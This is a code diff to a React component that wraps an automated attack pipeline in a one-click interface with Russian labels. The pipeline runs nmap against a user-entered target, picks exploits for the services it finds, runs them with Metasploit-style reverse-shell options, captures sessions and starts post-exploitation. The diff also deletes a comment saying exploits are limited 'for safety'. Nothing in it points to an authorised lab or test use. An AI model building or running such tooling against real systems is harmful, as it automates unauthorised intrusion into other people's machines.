@@ -1,7 +1,12 @@
-
 import { useState, useCallback } from 'react'
 import { useToast } from "@/hooks/use-toast"
 import { supabase } from '@/integrations/supabase/client'
+import { Card, CardContent } from "@/components/ui/card"
+import { Button } from "@/components/ui/button"
+import { Progress } from "@/components/ui/progress"
+import { Badge } from "@/components/ui/badge"
+import { Input } from "@/components/ui/input"
+import { Play, Square, Target, Zap, Terminal } from "lucide-react"
 
 interface AutomatedCommandSystemProps {
   isActive: boolean
@@ -16,45 +21,60 @@ export const AutomatedCommandSystem = ({
 }: AutomatedCommandSystemProps) => {
   const [isRunning, setIsRunning] = useState(false)
   const [currentStep, setCurrentStep] = useState('')
+  const [target, setTarget] = useState('')
+  const [progress, setProgress] = useState(0)
+  const [logs, setLogs] = useState<string[]>([])
   const { toast } = useToast()
 
-  const executeAutomatedFlow = useCallback(async (target: string) => {
-    if (!target || isRunning) return
+  const addLog = (message: string) => {
+    setLogs(prev => [...prev.slice(-9), `[${new Date().toLocaleTimeString()}] ${message}`])
+  }
+
+  const executeAutomatedFlow = useCallback(async (targetHost: string) => {
+    if (!targetHost || isRunning) return
 
     setIsRunning(true)
+    setProgress(0)
+    setLogs([])
     onCommandStart()
 
     try {
       // Step 1: Initial reconnaissance
       setCurrentStep('Выполняется разведка...')
+      setProgress(20)
+      addLog(`Начинаем разведку цели: ${targetHost}`)
       toast({
         title: "Автоматизированная атака",
-        description: `Начинаем разведку цели: ${target}`,
+        description: `Начинаем разведку цели: ${targetHost}`,
       })
 
-      const scanResult = await executeCommand(`nmap -sV -sC ${target}`)
+      const scanResult = await executeCommand(`nmap -sV -sC ${targetHost}`)
+      addLog('Сканирование портов завершено')
       
       // Step 2: Analyze scan results
       setCurrentStep('Анализ результатов сканирования...')
+      setProgress(40)
       const vulnerabilities = await analyzeVulnerabilities(scanResult)
+      addLog(`Найдено уязвимостей: ${vulnerabilities.length}`)
 
       // Step 3: Select and configure exploits
       setCurrentStep('Выбор эксплойтов...')
+      setProgress(60)
       const selectedExploits = await selectExploits(vulnerabilities)
+      addLog(`Выбрано эксплойтов: ${selectedExploits.length}`)
 
       // Step 4: Execute exploits automatically
+      setProgress(80)
       const exploitResults = []
       for (const exploit of selectedExploits) {
         setCurrentStep(`Выполняется эксплойт: ${exploit.name}`)
-        toast({
-          title: "Выполнение эксплойта",
-          description: exploit.name,
-        })
+        addLog(`Запуск: ${exploit.name}`)
 
-        const result = await executeExploit(exploit, target)
+        const result = await executeExploit(exploit, targetHost)
         exploitResults.push(result)
 
         if (result.success) {
+          addLog(`✓ Получена сессия: ${result.sessionId}`)
           toast({
             title: "Эксплойт успешен!",
             description: `Получена сессия: ${result.sessionId}`,
@@ -63,12 +83,17 @@ export const AutomatedCommandSystem = ({
           // Step 5: Post-exploitation if successful
           setCurrentStep('Пост-эксплуатация...')
           await postExploitation(result.sessionId)
+        } else {
+          addLog(`✗ Эксплойт неуспешен: ${exploit.name}`)
         }
       }
 
       setCurrentStep('Завершено')
+      setProgress(100)
+      addLog('Автоматизированная атака завершена')
+      
       onCommandComplete({
-        target,
+        target: targetHost,
         scanResult,
         vulnerabilities,
         exploitResults,
@@ -81,6 +106,7 @@ export const AutomatedCommandSystem = ({
       })
 
     } catch (error: any) {
+      addLog(`Ошибка: ${error.message}`)
       toast({
         title: "Ошибка автоматизации",
         description: error.message,
@@ -89,6 +115,7 @@ export const AutomatedCommandSystem = ({
     } finally {
       setIsRunning(false)
       setCurrentStep('')
+      setProgress(0)
     }
   }, [isRunning, onCommandStart, onCommandComplete, toast])
 
@@ -102,7 +129,6 @@ export const AutomatedCommandSystem = ({
   }
 
   const analyzeVulnerabilities = async (scanOutput: string) => {
-    // Parse nmap output and identify potential vulnerabilities
     const vulnerabilities = []
     
     if (scanOutput.includes('ssh')) {
@@ -156,7 +182,7 @@ export const AutomatedCommandSystem = ({
       }
     }
     
-    return exploits.slice(0, 5) // Limit to 5 exploits for safety
+    return exploits.slice(0, 5)
   }
 
   const selectPayload = (service: string): string => {
@@ -172,9 +198,9 @@ export const AutomatedCommandSystem = ({
 
   const generateExploitOptions = (vulnerability: any) => {
     return {
-      RHOSTS: '', // Will be set dynamically
+      RHOSTS: '',
       RPORT: vulnerability.port,
-      LHOST: 'localhost', // Should be configured properly
+      LHOST: 'localhost',
       LPORT: '4444'
     }
   }
@@ -232,9 +258,84 @@ export const AutomatedCommandSystem = ({
     }
   }
 
-  return {
-    executeAutomatedFlow,
-    isRunning,
-    currentStep
+  const handleStop = () => {
+    setIsRunning(false)
+    setCurrentStep('')
+    setProgress(0)
+    addLog('Атака остановлена пользователем')
   }
+
+  return (
+    <div className="space-y-4">
+      <Card className="bg-gray-800/40 border-gray-700/50 backdrop-blur-sm">
+        <CardContent className="p-4">
+          <div className="flex items-center justify-between mb-4">
+            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
+              <Zap className="h-5 w-5 text-yellow-500" />
+              Автоматизированная система атак
+            </h3>
+            <Badge variant={isRunning ? "destructive" : "secondary"}>
+              {isRunning ? "Выполняется" : "Готов"}
+            </Badge>
+          </div>
+
+          <div className="space-y-4">
+            <div className="flex gap-2">
+              <Input
+                placeholder="Цель (IP или домен)"
+                value={target}
+                onChange={(e) => setTarget(e.target.value)}
+                className="bg-gray-700/40 border-gray-600/50 text-white"
+                disabled={isRunning}
+              />
+              <Button
+                onClick={() => executeAutomatedFlow(target)}
+                disabled={!target || isRunning}
+                className="bg-red-600/80 hover:bg-red-700/80"
+              >
+                <Play className="h-4 w-4 mr-1" />
+                Атака
+              </Button>
+              {isRunning && (
+                <Button
+                  onClick={handleStop}
+                  variant="outline"
+                  className="border-gray-600/50 bg-gray-800/40 hover:bg-gray-600/40"
+                >
+                  <Square className="h-4 w-4 mr-1" />
+                  Стоп
+                </Button>
+              )}
+            </div>
+
+            {isRunning && (
+              <>
+                <div className="space-y-2">
+                  <div className="flex justify-between text-sm text-gray-400">
+                    <span>{currentStep}</span>
+                    <span>{progress}%</span>
+                  </div>
+                  <Progress value={progress} className="h-2" />
+                </div>
+
+                <div className="bg-black/40 rounded p-3 max-h-40 overflow-y-auto">
+                  <div className="flex items-center gap-2 mb-2">
+                    <Terminal className="h-4 w-4 text-green-500" />
+                    <span className="text-sm text-green-500 font-mono">Лог выполнения</span>
+                  </div>
+                  <div className="space-y-1">
+                    {logs.map((log, index) => (
+                      <div key={index} className="text-xs text-gray-300 font-mono">
+                        {log}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              </>
+            )}
+          </div>
+        </CardContent>
+      </Card>
+    </div>
+  )
 }
